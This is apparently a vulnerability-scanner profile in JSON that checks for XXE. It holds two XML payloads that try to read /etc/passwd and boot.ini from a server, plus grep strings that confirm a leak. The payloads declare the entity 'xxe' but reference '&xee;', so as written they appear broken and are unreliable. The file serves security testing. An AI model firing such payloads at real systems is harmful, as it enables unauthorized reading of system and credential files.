[{"Name":"Example_XXE",
"Active":true,
"Scanner":1,
"Author":"@egarme",
"Payloads":["\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file://c:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e",
"\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e"],
"Encoder":[],
"UrlEncode":false,
"CharsToUrlEncode":"",
"Grep":["root:x",
"boot loader"],
"PayloadResponse":false,
"NotResponse":false,
"NotCookie":false,
"TimeOut":0,
"isTime":false,
"CaseSensitive":false,
"isReplace":false,
"Replace1":"",
"Replace2":"",
"ExcludeHTTP":true,
"OnlyHTTP":false,
"IsContentType":false,
"ContentType":"",
"NegativeCT":false,
"IsResponseCode":false,
"ResponseCode":"",
"NegativeRC":false,
"MatchType":1,
"RedirType":4,
"MaxRedir":5,
"rCookies":false,
"spaceEncode":true,
"payloadPosition":1,
"sEncode":"%20",
"payloadsFile":"",
"grepsFile":"",
"IssueName":"XXE",
"IssueSeverity":"High",
"IssueConfidence":"Certain",
"IssueDetail":"XXE with payload: \u003cgrep\u003e",
"RemediationDetail":"",
"IssueBackground":"",
"RemediationBackground":""}]